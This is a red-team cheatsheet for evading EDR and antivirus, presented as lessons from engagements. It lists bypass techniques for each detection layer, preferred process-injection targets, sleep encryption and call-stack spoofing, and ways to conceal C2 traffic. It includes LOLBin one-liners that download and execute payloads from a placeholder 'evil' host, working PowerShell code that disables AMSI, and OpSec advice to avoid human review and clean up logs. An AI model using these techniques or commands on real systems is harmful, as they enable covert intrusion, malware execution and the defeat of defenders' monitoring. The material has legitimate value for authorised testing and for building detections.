# EDR/AV Bypass and Covert Operations Cheatsheet

> Source: lessons learned from multiple red team engagements (2024-2026)
> Scope: reference when operations must run in environments protected by EDR/AV

---

## Detection Layers and Corresponding Bypasses

| Detection layer | What the EDR does | Bypass approach |
|--------|-----------|---------|
| Static signatures | Matches known malicious file hashes/signatures | Custom compilation, encrypted payloads, modify signatures |
| User-mode hooks | Hooks ntdll.dll to monitor API calls | Direct syscalls / Unhooking / ship your own ntdll |
| Kernel callbacks | Registers process/thread/image-load callbacks | Callback removal (needs a driver) / injection into legitimate processes |
| ETW | Collects events via ETW | Patch EtwEventWrite / disable providers |
| Behavior analysis | Analyzes call sequences and behavior patterns | Delayed execution / spread out operations / mimic normal behavior |
| Memory scanning | Periodically scans process memory | Heap encryption / encrypt payload while sleeping / module stomping |
| Network detection | Analyzes outbound traffic characteristics | Domain fronting / tunneling via legitimate services / encryption |

---

## Practical Bypass Techniques

### 1. Direct System Calls (bypassing user-mode hooks)

```
Principle: do not go through ntdll.dll; invoke the kernel directly with the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses all user-mode hooks
```

### 2. Unhooking (restoring the original ntdll)

```
Method A: remap ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restores hooked APIs to their original state
```

### 3. Process Injection (choosing low-monitoring targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (heavily monitored)
- svchost.exe (some EDRs focus on it)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: write the payload into the .text section of an already-loaded legitimate DLL
Effect: memory scans see a legitimate module instead of suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Principle: encrypt the beacon's own memory while it sleeps
Effect: memory scans cannot find payload signatures
Implementation: register a timer callback, encrypt before sleeping, decrypt after waking
```

### 6. Call Stack Spoofing

```
Principle: forge the call stack so API calls appear to originate from legitimate code
Effect: bypasses call-stack-based behavioral detection
```

---

## C2 Traffic Concealment

| Technique | Principle | Detection difficulty |
|------|------|---------|
| Domain fronting | The SNI and Host header of the HTTPS request differ | High |
| Cloudflare Workers | Relayed through CF, looks like normal HTTPS | High |
| Azure/AWS legitimate services | Uses cloud service APIs as the C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connection, blends into normal web traffic | Medium |
| ICMP tunneling | Data hidden inside ICMP packets | Low (easily discovered) |

---

## LOLBins (Living Off the Land)

Use legitimate programs built into the system to perform malicious operations:

| Program | Purpose | Example command |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be caught by signature detection)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# More stealthy: reflectively modify AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Principle of least action** — do not touch what you do not need to; reuse existing credentials rather than creating new ones
2. **Time windows** — operate outside the target's working hours (reduces the chance of human review)
3. **Traffic blending** — make C2 communication frequency and size mimic normal business traffic
4. **Tools never touch disk** — execute in memory, clean up when done
5. **Log awareness** — know which operations produce which logs; avoid them in advance or clean up afterward
6. **Honeypot recognition** — identify honeypots before acting (abnormally open services, overly tempting credentials)
7. **Staged operations** — do not complete every step at once; spread them across multiple time windows
